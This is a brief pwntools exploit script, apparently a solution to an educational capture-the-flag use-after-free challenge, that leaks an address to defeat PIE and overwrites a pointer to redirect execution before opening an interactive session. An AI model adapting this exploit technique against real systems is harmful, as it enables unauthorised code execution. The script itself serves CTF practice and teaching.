from pwn import *

host = 'edu-ctf.csie.org'
port = 10177

#r = process('./uaf')
r = remote(host, port)
context.arch = 'amd64'

r.sendafter(": ", str(0x10))
r.sendafter(": ", b'a' * 8)

r.recvuntil('a' * 8)

pie = u64(r.recv(6) + b'\0\0') - 0xa77
print("PIE -> %s", hex(pie))

r.sendafter(": ", str(0x10))
r.sendafter(": ", b'a' * 8 + p64(pie + 0xab5))

r.interactive()
